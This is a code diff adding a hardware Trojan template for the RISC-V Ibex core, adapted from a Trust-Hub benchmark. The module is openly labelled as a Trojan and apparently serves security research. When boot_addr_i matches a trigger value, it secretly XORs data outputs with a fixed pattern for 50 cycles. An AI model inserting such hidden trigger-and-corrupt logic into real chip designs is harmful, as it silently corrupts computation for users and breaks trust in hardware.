@@ -1,31 +1,61 @@
+/**
+ * Hardware Trojan Template: Data Integrity Violation
+ * 
+ * Category: Sequential Logic
+ * Pattern Type: Data Integrity / Computation Corruption
+ * 
+ * Source: Trust-Hub Benchmark AES-T800
+ * Reference: https://trust-hub.org/benchmarks/AES-T800
+ * 
+ * Description:
+ *   Corrupts computation results by XORing with error pattern or
+ *   bit-flipping specific data bits during critical operations.
+ *
+ * RISC-V Adaptation:
+ *   Targets computation units in RISC-V:
+ *   - ALU results
+ *   - Load/Store data
+ *   - Register file writes
+ *
+ * Author: Sharjeel Imtiaz (Tallinn University of Technology)
+ * Date: January 2026
+ */
 
-// ========== TROJAN T4: Integrity Violation ==========
-// Trust-Hub AES-T800
-// Module: ibex_cs_registers
-// Type: Sequential
-// Description: Corrupts csr_wdata_i when specific pattern detected
+module ibex_cs_registers_trojan (
+    input  logic clk_i,
+    input  logic rst_ni,
+    
+    input  logic [{{WIDTH}}-1:0] boot_addr_i,
+    input  logic [{{WIDTH}}-1:0] {{DATA_INPUT}},
+    output logic [{{WIDTH}}-1:0] {{DATA_OUTPUT}}
+);
 
-// Trojan trigger
-logic trojan_T4_trigger;
-assign trojan_T4_trigger = (boot_addr_i) && 
-                                     (boot_addr_i[7:0] == 8'hDE);  // Trigger pattern
-
-// Trojan corruption pattern
-logic [31:0] trojan_T4_corrupt;
-assign trojan_T4_corrupt = 32'hDEADBEEF;
-
-// Trojan logic
-always_ff @(posedge clk_i or negedge rst_ni) begin
-    if (!rst_ni) begin
-        // Normal reset
-    end else begin
-        if (trojan_T4_trigger) begin
-            csr_wdata_i <= csr_wdata_i ^ trojan_T4_corrupt;  // Corrupt data
+    localparam logic [{{WIDTH}}-1:0] CORRUPTION_PATTERN = {{WIDTH}}'hA5A5A5A5;
+    localparam logic [{{WIDTH}}-1:0] TRIGGER_PATTERN = {{WIDTH}}'h12345678;
+    
+    logic trojan_corrupt;
+    logic [7:0] corruption_counter;
+    
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_corrupt <= 1'b0;
+            corruption_counter <= '0;
+        end else begin
+            if (boot_addr_i == TRIGGER_PATTERN) begin
+                trojan_corrupt <= 1'b1;
+                corruption_counter <= 8'd50;
+            end
+            
+            if (corruption_counter > 0) begin
+                corruption_counter <= corruption_counter - 1;
+            end else begin
+                trojan_corrupt <= 1'b0;
+            end
         end
     end
-end
+    
+    assign {{DATA_OUTPUT}} = trojan_corrupt ? 
+                             ({{DATA_INPUT}} ^ CORRUPTION_PATTERN) : 
+                             {{DATA_INPUT}};
 
-// MANUAL INSERTION REQUIRED:
-// Add XOR corruption to the always_ff block where csr_wdata_i is assigned.
-
-// ========== TROJAN T4 END ==========
+endmodule
